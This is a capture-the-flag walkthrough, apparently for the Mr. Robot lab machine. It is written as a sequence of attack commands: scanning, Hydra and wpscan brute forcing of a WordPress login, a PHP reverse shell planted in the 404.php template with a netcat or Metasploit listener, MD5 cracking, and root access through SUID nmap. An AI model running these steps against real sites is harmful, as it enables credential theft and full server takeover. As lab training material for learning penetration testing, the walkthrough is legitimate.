netdiscover -i wlan0    #To get the ip address of the ctf machine.
  > 192.168.43.23 is the ip address of the ctf machine

nikto -h "ip address"    #for vulnerability scanning
   > Shows robots.txt file
   > Shows wordpress installation

Go to browser and type: 192.168.43.23/robots.txt      
   > Show two file:
      1. fsocity.dic    #dictionary_file
      2. key-1-of-3.txt   #First_flag
   
wget 192.168.43.23/fsocity.dic    #download the dictionary file

Go to the browser and type: 192.168.43.23/wp-admin    #wordpress has a login page associated with "wp-admin"
  
Now, sort the dictionary file using command:    cat fsocity.dic | sort -u | uniq > wordlist.dic 
    > sort -u (to sort data in ascending order)
    > uniq (remove duplicates in the file)
    
We need to get a HTTP-POST request, for that:
    > Open BurpSuite
    > Turn on the intercept
    > Go to the login page and type random username (test) and password (123)
    > Now, go back to BurpSuite and look for fields: log (username) , pwd (password) and wp-submit.
Now, we need to test all the words which are present in the fsocity.dic file to find the username hidden in the file.
For that we need to check all the words with the random password until wordpress gives us a response telling that this user exists and the password entered is wrong.
We'll be using Hydra cracking tool to check the username.

hydra -V -L fsocity.dic -p 123 192.168.43.23 http-post-form '/wp-login.php: log=^USER^&pwd=^PASS^&wp-submit=LOG+IN:F=Invalid username'

We got the username "Elliot". Now we'll bruteforce the password using "wpscan"

wpscan --url 192.168.43.23 --wordlist /root/wordlist.dic --username Elliot          #old_command
wpscan --url 192.168.43.23 --passwords "password_file" --usernames "username"       #new_command

We get password ER28-0652 and username Elliot. Now, go to the login page and type username and password. You will be inside wordpress.
Go to users and check whether you are administrator or not. In this case, Elliot is an administrator which means you can add plugins.

Now, we need to exploit the wordpress server and for that we need to install a reverse shell.
  We can create a reverse shell by < msfvenom > command or we can downlaod it from pentestmonkey.net
  
First Method: Downloading the php reverse shell

http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz

  > Extract the tar file and open it in a text editor.
  > Change the ip address and port accordingly.
  > Copy the entire code and paste it in 404.php plugin
  
nc -lvp 1234    #netcat command use to listen on port 1234 (use port mentioned in the php file)
  
curl http://192.168.43.23/404.php     #To get reverse shell using the payload
  
You will get a shell. Type command < id > to check the id, you are Daemon.
  To spawn a shell, use command (tty)
  
python -c 'import pty; pty.spawn("/bin/sh")'
  
Type commands in the shell:
    > ls
    > cd /home
    > cd robot
You will get two files here:
    1. key-2-of-3.txt     #Second_flag (permission denied)
    2. password.raw-md5     #md5_encryption_password
      
After decrypting the hash in the password.raw-md5 file, we get password - abcdefghijklmnopqrstuvwxyz

su - robot
  > enter password
  > check id
You can access key-2-of-3.txt.

Now, we need to perform privilege escalation to get the third flag.
We need to search for files, scripts or programs that can be accessed and we can use interactive mode. For that, we need to find files with superuser access.

find / -perm -4000 2>/dev/null
  > We found nmap
Type commands:
  > nmap --interactive
  > !sh
  > id
  > cd /root
  > ls
After listing, you get two files:
    1. key-3-of-3.txt     #Third_flag
    2. firstboot_done
    
Second method: Using Metasploit

msfvenom -p php/meterpreter/reverse_tcp lhost "ip address" lport "port number" -f raw       #create_payload

Copy the code (payload) and paste it in 404.php template in wordpress.

Now, open Metasploit 
    > msfconsole
And type commands:
    > use exploit/multi/handler
    > set payload php/meterpreter/reverse_tcp
    > set lhost "ip address"
    > set lport "port number"
    > exploit
    
Reload the path:  http://192.168.43.23/wp-content/themes/twentyfifteen/404.php
  You will get the shell access.
 
After getting the shell access the process is same as in the first method.
